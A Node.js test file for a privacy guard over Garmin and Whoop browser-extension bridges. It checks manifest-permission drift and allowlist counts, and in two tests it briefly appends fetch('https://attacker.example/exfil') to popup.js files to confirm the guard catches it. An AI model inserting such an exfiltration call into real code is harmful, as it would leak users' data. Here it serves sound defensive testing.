import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { copyFileSync, existsSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = dirname(HERE);
const SCRIPT = join(HERE, "check-bridge-privacy-surface.mjs");
const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");

const runGuard = () =>
  spawnSync("node", [SCRIPT], {
    cwd: REPO,
    encoding: "utf8",
  });

describe("bridge privacy surface guard", () => {
  it("passes against the checked-in golden", () => {
    const result = runGuard();

    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /matches golden/);
  });

  it("fails when the manifest permissions drift from the golden", () => {
    const original = readFileSync(GOLDEN, "utf8");
    const tampered = JSON.parse(original);
    tampered["garmin-bridge"].manifest.permissions = [
      "storage",
      "tabs",
      "webRequest",
      "alarms",
    ];
    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
    } finally {
      writeFileSync(GOLDEN, original);
    }
  });

  it("fails on an absolute-URL fetch in popup.js", () => {
    const original = readFileSync(POPUP, "utf8");
    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
    writeFileSync(POPUP, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /absolute-URL fetch/);
    } finally {
      writeFileSync(POPUP, original);
    }
  });

  it("covers whoop-bridge popup.js despite its missing manifest.prod.json", () => {
    const original = readFileSync(WHOOP_POPUP, "utf8");
    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
    writeFileSync(WHOOP_POPUP, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /absolute-URL fetch/);
      assert.match(result.stderr, /whoop-bridge/);
    } finally {
      writeFileSync(WHOOP_POPUP, original);
    }
  });

  it("verifies the script is executable directly", () => {
    // Smoke test that the import side-effect isn't broken.
    assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
  });

  it("fixture allowed_paths count matches each bridge's content.js ALLOWED count", () => {
    // Mechanical drift catcher: if a future PR adds an entry to content.js
    // ALLOWED but forgets the golden, this assertion fires before the guard
    // run-comparison even gets to surface the diff. Mirrors §2.2b of the
    // train2go-zones-sync change.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    for (const bridge of Object.keys(golden)) {
      const contentPath = join(REPO, "packages", bridge, "content.js");
      if (!existsSync(contentPath)) {
        // Bridges without a site content script (whoop) declare an empty
        // allowlist in the golden; nothing to cross-count.
        assert.deepEqual(golden[bridge].allowed_paths, []);
        continue;
      }
      const contentSrc = readFileSync(contentPath, "utf8");
      const start = contentSrc.indexOf("const ALLOWED");
      assert.ok(start >= 0, `${bridge}: content.js has no ALLOWED const`);
      const end = contentSrc.indexOf("];", start);
      assert.ok(
        end >= 0,
        `${bridge}: content.js ALLOWED array has no closing "];" — array was probably truncated`
      );
      const body = contentSrc.slice(start, end + 2);
      const inLineEntryCount = body
        .split("\n")
        .filter(
          (l) => /method:\s*"[A-Z]+"/.test(l) && /pattern:\s*\//.test(l)
        ).length;
      const fixtureCount = golden[bridge].allowed_paths.length;
      assert.equal(
        fixtureCount,
        inLineEntryCount,
        `${bridge}: fixture has ${fixtureCount} allowed_paths but content.js ALLOWED has ${inLineEntryCount} single-line entries`
      );
    }
  });
});

void copyFileSync;
